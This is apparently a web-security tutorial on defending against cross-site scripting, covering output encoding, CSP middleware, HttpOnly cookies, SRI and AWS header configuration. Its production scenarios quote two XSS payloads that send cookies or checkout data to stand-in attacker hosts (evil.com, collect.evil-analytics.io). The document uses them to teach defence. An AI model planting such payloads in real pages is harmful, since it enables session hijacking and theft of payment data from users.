# XSS Attack — Part 2 of 3

### Sections: 5 (Defense Mechanisms), 6 (Architecture Diagram), 7 (Production Scenarios), 8 (AWS Mapping)

**Series:** Authentication & Security → Topic 07

---

## SECTION 5 — Defense Mechanisms

### Defense 1: Output Encoding Per Context (The Fundamental Rule)

```javascript
// The encoding mechanism depends on the context where data is inserted.
// Every context has different "dangerous characters."

// CONTEXT GUIDE:
// 1. HTML Body:      < > & " '  → HTML entity encode
// 2. HTML Attribute: < > & " '  → HTML attribute encode
// 3. JavaScript:     " ' \ / \n → JSON.stringify
// 4. URL:            all non-alphanumeric → encodeURIComponent
// 5. CSS:            All user input → FORBIDDEN (no safe way)

// ─── TEMPLATE ENGINES ────────────────────────────────────────────────
// Most modern template engines auto-escape HTML by default:
// EJS:       <%= variable %>   ← auto-escaped
//            <%- variable %>   ← RAW, NO ESCAPING ← only for trusted content
//
// Pug:       #{variable}       ← auto-escaped
//            !{variable}       ← unescaped ← only for trusted content
//
// Handlebars: {{ variable }}   ← auto-escaped
//             {{{ variable }}} ← triple-brace = unescaped ← danger
//
// React JSX:  {variable}       ← auto-escaped by React's createElement
//             dangerouslySetInnerHTML={{ __html: variable }} ← danger

// ─── SAFE PATTERNS ─────────────────────────────────────────────────────
// REACT (safe):
const UserComment = ({ comment }) => (
  <div className="comment">
    <p>{comment.text}</p> {/* React escapes: < > & " ' */}
  </div>
);

// REACT (safe with sanitized HTML if rich text needed):
import DOMPurify from "dompurify";
const RichComment = ({ html }) => (
  <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
);

// NODE.JS (safe template rendering):
app.get("/search", (req, res) => {
  const query = req.query.q;
  // SAFE: Express will pass query to EJS where = auto-escapes
  res.render("search", { query });
  // EJS template: <p>Results for: <%= query %></p>  ← SAFE
  // EJS template: <p>Results for: <%- query %></p>  ← DANGER (raw)
});
```

### Defense 2: Content Security Policy (Production-Grade)

```javascript
// csp.middleware.js — Comprehensive production CSP

import crypto from "crypto";

function cspMiddleware(req, res, next) {
  // Generate a new nonce for every request
  const nonce = crypto.randomBytes(16).toString("base64");
  res.locals.cspNonce = nonce;

  const directives = {
    "default-src": ["'self'"],
    "script-src": [
      "'self'",
      `'nonce-${nonce}'`, // Only scripts with this nonce
      "'strict-dynamic'", // Trusted scripts can load other scripts dynamically
      // DO NOT add 'unsafe-inline' or 'unsafe-eval' — defeats the purpose
    ],
    "style-src": [
      "'self'",
      `'nonce-${nonce}'`,
      // Needed for some CSS-in-JS: 'unsafe-inline' — but weakens protection
    ],
    "img-src": ["'self'", "data:", "https:"],
    "font-src": ["'self'", "https://fonts.gstatic.com"],
    "connect-src": ["'self'", "https://api.yourapp.com"],
    "media-src": ["'none'"],
    "object-src": ["'none'"], // No Flash, no plugins
    "frame-ancestors": ["'none'"], // Prevents embedding in iframes (clickjacking)
    "base-uri": ["'self'"], // Prevents <base> href injection
    "form-action": ["'self'"], // Forms only submit to your origin
    "upgrade-insecure-requests": [], // HTTP → HTTPS
  };

  const cspHeader = Object.entries(directives)
    .map(([directive, values]) =>
      values.length > 0 ? `${directive} ${values.join(" ")}` : directive,
    )
    .join("; ");

  // For production: start with Report-Only to catch violations before breaking things
  // res.setHeader('Content-Security-Policy-Report-Only', cspHeader + '; report-uri /csp-report');
  // Once confident: switch to enforcement:
  res.setHeader("Content-Security-Policy", cspHeader);

  next();
}

// CSP Violation Endpoint — collect browser CSP reports
app.post(
  "/csp-report",
  express.json({ type: "application/csp-report" }),
  (req, res) => {
    const report = req.body["csp-report"];
    console.warn({
      event: "CSP_VIOLATION",
      blockedUri: report["blocked-uri"],
      violatedDirective: report["violated-directive"],
      documentUri: report["document-uri"],
      originalPolicy: report["original-policy"],
    });
    res.status(204).send();
  },
);
```

### Defense 3: HttpOnly + Secure Cookies (Mitigates Impact)

```javascript
// XSS can steal cookies — unless they're HttpOnly
// HttpOnly: cookie not accessible via document.cookie in JavaScript
// This doesn't prevent XSS but LIMITS what XSS can steal.

res.cookie("sessionId", sessionId, {
  httpOnly: true, // document.cookie won't show this. XSS can't steal it directly.
  secure: true, // HTTPS only
  sameSite: "Lax",
});

// Attacker with XSS AND HttpOnly cookies:
//   CANNOT steal: cookie directly (HttpOnly blocks document.cookie)
//   CAN still do: make authenticated API requests from within the page (fetch/xhr)
//   CAN still do: steal data from API responses
//   CAN still do: modify DOM, keylog, etc.
// HttpOnly limits blast radius — doesn't make XSS harmless.

// ANTI-PATTERNS TO AVOID:
// Storing auth in localStorage — no HttpOnly equivalent. XSS steals it directly.
// localStorage.setItem('authToken', token);  ← NEVER do this
// sessionStorage: same issue. Both fully accessible to any script on the page.
```

### Defense 4: Subresource Integrity (SRI) for Third-Party Scripts

```html
<!-- SRI: verify third-party scripts haven't been tampered with -->

<!-- GENERATE hash: openssl dgst -sha384 -binary FILE | openssl base64 -A -->
<!-- OR: use https://www.srihash.org/ for public CDN resources -->

<!-- SECURE: SRI attribute locks script to exact file content -->
<script
  src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"
  integrity="sha384-<base64-sha384-hash>"
  crossorigin="anonymous"
></script>

<!-- If file content changes (even by 1 byte) → browser blocks execution -->

<!-- ALSO: preload and SRI are compatible -->
<link
  rel="preload"
  href="https://cdn.io/lib.js"
  as="script"
  integrity="sha384-..."
  crossorigin
/>

<!-- FOR CSP + SRI: you can use hash in script-src 
     Content-Security-Policy: script-src 'sha384-<hash>'
     → Script executes only if its SHA384 hash matches.
     → Works for inline scripts too (hash the inline content) -->
```

---

## SECTION 6 — Architecture Diagram

```
XSS DEFENSE ARCHITECTURE

CLIENT SPA (React)
┌────────────────────────────────────────────────────────────────────────────────┐
│  React renders: {userContent} → auto-escaped (safe)                           │
│  Rich text: DOMPurify.sanitize(content) before dangerouslySetInnerHTML        │
│  Dynamic DOM: always use textContent, never innerHTML with user data           │
│  Auth tokens: never in localStorage. In HttpOnly cookies only.                │
│  Third-party scripts: loaded with SRI hashes                                  │
└───────────────────────────────────┬───────────────────────────────────────────┘
                                    │
                                    ▼
CLOUDFRONT
┌────────────────────────────────────────────────────────────────────────────────┐
│  Adds security headers to all responses:                                       │
│    Content-Security-Policy: [nonce-based policy]                               │
│    X-Content-Type-Options: nosniff                                             │
│    X-Frame-Options: DENY  (prevents clickjacking)                             │
│    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload     │
│  WAF: managed XSS rule set (pattern-based). Blocks obvious payloads.          │
│  WAF: blocks requests matching common XSS patterns in query/body               │
└───────────────────────────────────┬───────────────────────────────────────────┘
                                    ▼
APPLICATION SERVER
┌────────────────────────────────────────────────────────────────────────────────┐
│  Middleware:                                                                    │
│  1. cspMiddleware — generates per-request nonce, sets CSP header              │
│  2. helmet() — X-Frame-Options, X-Content-Type-Options, HSTS                 │
│  3. Input validation (Zod)  — type check, length limits, pattern validation   │
│  4. Output: template engine escapes by default (EJS %= vs %-）               │
│                                                                                │
│  Storage: DOMPurify.sanitize() on any rich-text content BEFORE storing         │
│           (defense in depth: sanitize at write + escape at read)               │
└───────────────────────────────────┬───────────────────────────────────────────┘
                                    ▼
DATABASE
┌────────────────────────────────────────────────────────────────────────────────┐
│  Stores: DOMPurify-sanitized HTML for rich text                                │
│          OR plain escaped text for plain text fields                           │
│  NEVER stores: raw unescaped user HTML with script tags                        │
└────────────────────────────────────────────────────────────────────────────────┘

ATTACKER FLOW (what gets blocked and where):

  Stored XSS payload: <script>alert(1)</script> in bio:
  ┌──────────────────────────────────────────────────────────────────────────────┐
  │ Write time: DOMPurify strips <script> → stored as empty or sanitized text   │
  │ Read time: ESC escapes remaining HTML chars → rendered as literal text      │
  │ CSP: even if script reached browser, nonce required → blocked               │
  │ Result: 3 layers all block. XSS fails.                                       │
  └──────────────────────────────────────────────────────────────────────────────┘
```

---

## SECTION 7 — Production Scenarios

### Scenario 1: The Markdown Editor That Became a Backdoor

```
COMPANY: CollabDocs — a shared document editing SaaS.
FEATURE: Markdown editor that renders user-written Markdown as HTML.

MISTAKE:
  Backend converts Markdown → HTML using markdown-it library.
  The rendered HTML is stored in the database.
  When users view the document: stored HTML is inserted with dangerouslySetInnerHTML.

  markdown-it OUTPUT (default config):
    Input:  [Click me](javascript:alert(1))
    Output: <a href="javascript:alert(1)">Click me</a>

  WHAT HAPPENED:
    Attacker created a shared document with:
      [Click here for report](javascript:fetch('https://evil.com?t='+document.cookie))

    Shared the document with a company's finance team.
    Finance team opened the doc. Lead analyst clicked the link.
    Cookie (non-HttpOnly) sent to evil.com.
    Attacker used session to access financial projections.

CORRECT IMPLEMENTATION:
  Option 1: DOMPurify after markdown-it:
    const rawHtml = markdownIt.render(content);
    const safeHtml = DOMPurify.sanitize(rawHtml, {
      ALLOWED_TAGS: ['p', 'h1', 'h2', 'h3', 'h4', 'ul', 'ol', 'li', 'a',
                      'em', 'strong', 'code', 'pre', 'blockquote'],
      ALLOWED_ATTR: ['href'],
      // Disallow javascript: and data: URLs in href
      FORCE_BODY: true
    });

  Option 2: Configure markdown-it to disable dangerous HTML:
    const md = markdownIt({ html: false, linkify: false });
    // html: false → HTML tags in Markdown are escaped, not passed through
    // Add URL sanitizer hook:
    md.core.ruler.push('sanitize_links', (state) => {
      state.tokens.filter(t => t.type === 'inline').forEach(token => {
        token.children.filter(c => c.type === 'link_open').forEach(link => {
          const href = link.attrGet('href');
          if (href && !href.startsWith('https://') && !href.startsWith('http://')) {
            link.attrSet('href', '#');  // Remove dangerous protocol links
          }
        });
      });
    });
```

### Scenario 2: CSP Reporting Catches XSS in Production

```
COMPANY: PayStream — payment processing portal.
SETUP: Deployed Content-Security-Policy-Report-Only header first (monitoring, not blocking).

CSP Report endpoint starts receiving unusual reports after a new feature release:

SAMPLE REPORT:
{
  "csp-report": {
    "blocked-uri": "https://collect.evil-analytics.io",
    "violated-directive": "connect-src",
    "source-file": "https://paystream.com/checkout",
    "line-number": 1,
    "script-sample": "fetch('https://collect.evil-analyt..."
  }
}

INVESTIGATION:
  Line-number: 1 → dynamically injected script (not from source file).
  Blocked URI: connect-src violation → script tried to fetch to external domain.
  Source file: /checkout → highest-sensitivity page.

  Found: A comment field in the checkout form was being rendered using innerHTML.
  Input: <img src=x onerror="fetch('https://collect.evil-analytics.io?d='+btoa(JSON.stringify(window._checkoutState)))">
  _checkoutState: contained partial card data.

  CSP in REPORT-ONLY mode: payload executed but THEN browser reported the violation.
  After switching CSP to ENFORCEMENT mode: payload blocked before execution.

LESSON:
  1. Deploy CSP in Report-Only first to collect violations without breaking users.
  2. Fix real violations (legitimate third-party fetches you need to allow).
  3. Switch to enforcement mode — now XSS payloads making external requests are blocked.
  4. CSP caught an active XSS that the WAF missed (payload was obfuscated, not pattern-matched).
```

---

## SECTION 8 — AWS Mapping

### AWS Services for XSS Defense

```
┌──────────────────────────┬────────────────────────────────────────────────────────┐
│ AWS Service              │ Role in XSS Defense                                    │
├──────────────────────────┼────────────────────────────────────────────────────────┤
│ AWS WAF                  │ Managed rule: AWSManagedRulesCommonRuleSet              │
│                          │   includes XSScoreXSS_BODY, XSS_QUERYARGUMENTS         │
│                          │   blocks patterns like <script>, javascript:, onerror= │
│                          │   Rate limiting rules for scanning/fuzzing detection   │
│                          │ Custom rule: block requests with known XSS patterns    │
├──────────────────────────┼────────────────────────────────────────────────────────┤
│ CloudFront               │ Add security headers to all responses:                 │
│                          │   Content-Security-Policy (static header or via Lambda)│
│                          │   X-Content-Type-Options: nosniff                      │
│                          │   X-Frame-Options: DENY                               │
│                          │   Strict-Transport-Security                            │
│                          │ CloudFront Functions or Lambda@Edge for dynamic nonces │
├──────────────────────────┼────────────────────────────────────────────────────────┤
│ Lambda@Edge              │ For nonce-based CSP: Lambda@Edge injects nonce per    │
│                          │ request (nonce must be unique per request)             │
│                          │ Functions: lightweight for simple header injection     │
│                          │ Lambda@Edge: full JavaScript for complex nonce logic   │
├──────────────────────────┼────────────────────────────────────────────────────────┤
│ CloudWatch               │ CSP violation reports → Lambda → CloudWatch metrics   │
│                          │ Alarm on: spike in CSP violations (active attack)      │
│                          │ Log Insights: query for violation patterns             │
├──────────────────────────┼────────────────────────────────────────────────────────┤
│ S3 (static hosting)      │ Static site: set response headers via S3 + CloudFront │
│                          │ Or CloudFront response headers policy for all origins │
└──────────────────────────┴────────────────────────────────────────────────────────┘
```

### Security Headers via CloudFront Response Headers Policy

```json
{
  "ResponseHeadersPolicyConfig": {
    "Name": "SecurityHeaders",
    "SecurityHeadersConfig": {
      "ContentTypeOptions": { "Override": true },
      "FrameOptions": { "FrameOption": "DENY", "Override": true },
      "StrictTransportSecurity": {
        "AccessControlMaxAgeSec": 31536000,
        "IncludeSubdomains": true,
        "Preload": true,
        "Override": true
      },
      "XSSProtection": {
        "Protection": true,
        "ModeBlock": true,
        "Override": true
      },
      "ReferrerPolicy": {
        "ReferrerPolicy": "strict-origin-when-cross-origin",
        "Override": true
      }
    },
    "CustomHeadersConfig": {
      "Items": [
        {
          "Header": "Permissions-Policy",
          "Value": "camera=(), microphone=(), geolocation=(), payment=(self)",
          "Override": true
        }
      ]
    }
  }
}
```

### Lambda@Edge for Dynamic CSP Nonces

```javascript
// Lambda@Edge: viewer-response function
// Adds a fresh nonce to CSP header for every response.
// Problem: nonce must match what the HTML server-side rendered.
// Solution: use this ONLY if your origin server sets the nonce first and
//           passes it via a response header for Lambda to use.

// SIMPLER APPROACH for static sites: use CSP hashes instead of nonces.
// Hash the exact inline script content with SHA-256.
// CSP: script-src 'sha256-<hash>'
// This works for STATIC inline scripts (content doesn't change per request).

import crypto from "crypto";

export const handler = async (event) => {
  const response = event.Records[0].cf.response;

  // Get nonce set by origin server
  const originNonce = response.headers["x-csp-nonce"]?.[0]?.value;

  if (originNonce) {
    response.headers["content-security-policy"] = [
      {
        key: "Content-Security-Policy",
        value: [
          `default-src 'self'`,
          `script-src 'self' 'nonce-${originNonce}' 'strict-dynamic'`,
          `style-src 'self' 'nonce-${originNonce}'`,
          `img-src 'self' data: https:`,
          `object-src 'none'`,
          `frame-ancestors 'none'`,
          `base-uri 'self'`,
          `form-action 'self'`,
        ].join("; "),
      },
    ];

    // Remove the internal header — don't expose to client
    delete response.headers["x-csp-nonce"];
  }

  return response;
};
```
